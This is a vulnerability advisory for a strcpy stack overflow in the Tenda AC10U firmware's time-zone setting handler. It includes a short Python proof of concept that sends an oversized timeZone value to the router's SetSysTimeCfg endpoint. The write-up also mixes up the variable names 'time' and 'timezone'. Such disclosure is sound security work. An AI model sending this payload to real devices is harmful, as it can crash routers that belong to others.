## Overview

- Firmware download website: https://www.tendacn.com/download/detail-3170.html

## Affected version

AC10U v1.0 Firmware  V15.03.06.48

## Vulnerability details

The Tenda AC10U v1.0 Firmware  V15.03.06.48 firmware has a stack overflow vulnerability in the `fromSetSysTime` function. The `timezone` variable receives the `timeZone` parameter from a POST request and is assigned to `timezone_buf` by `strcpy`. However, since the user can control the input of `time`, the statement `strcpy(timezone_buf, timezone);` can cause a buffer overflow. The user-provided  `time` can exceed the capacity of the `timezone_buf` array, triggering this security vulnerability.

![image-20240316224001545](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240316224001545.png)

![image-20240316223928851](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240316223928851.png)

![image-20240316223948112](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240316223948112.png)

## POC

```python
import requests
from pwn import*

ip = "192.168.84.101"
url = "http://" + ip + "/goform/SetSysTimeCfg"
payload = b"a"*2000

data = {
        'timeType':'sync',
        'timeZone':payload,
    }
response = requests.post(url, data=data)
print(response.text)
```

![image-20240316224156695](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240316224156695.png)
